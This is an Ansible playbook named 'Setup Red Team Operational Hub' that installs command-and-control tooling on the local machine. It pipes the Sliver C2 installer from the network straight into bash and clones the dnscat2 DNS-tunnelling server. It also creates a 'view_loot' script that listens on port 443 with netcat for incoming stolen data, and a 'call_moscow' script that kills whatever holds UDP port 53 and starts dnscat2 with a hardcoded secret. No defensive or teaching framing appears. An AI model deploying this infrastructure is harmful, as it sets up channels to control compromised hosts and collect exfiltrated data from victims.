---
- name: Setup Red Team Operational Hub
  hosts: localhost
  become: true
  tasks:
    - name: Install dependencies
      apt:
        name: [git, ruby-full, python3, jq, tmux, netcat-openbsd]
        state: present

    - name: Install Sliver C2
      shell: "curl https://sliver.sh/install | bash"
      args:
        creates: /usr/local/bin/sliver-server

    - name: Setup dnscat2 Server
      git:
        repo: "https://github.com/iagox86/dnscat2.git"
        dest: "/opt/dnscat2"
    
    - name: Create 'view_loot' command
      copy:
        dest: /usr/local/bin/view_loot
        mode: '0755'
        content: |
          #!/bin/bash
          sudo nc -lk -p 443 | jq .

    - name: Create 'call_moscow' command
      copy:
        dest: /usr/local/bin/call_moscow
        mode: '0755'
        content: |
          #!/bin/bash
          sudo fuser -k 53/udp 2>/dev/null
          sudo ruby /opt/dnscat2/server/dnscat2.rb --dns "port=53" --secret=HW4_Secret_2026
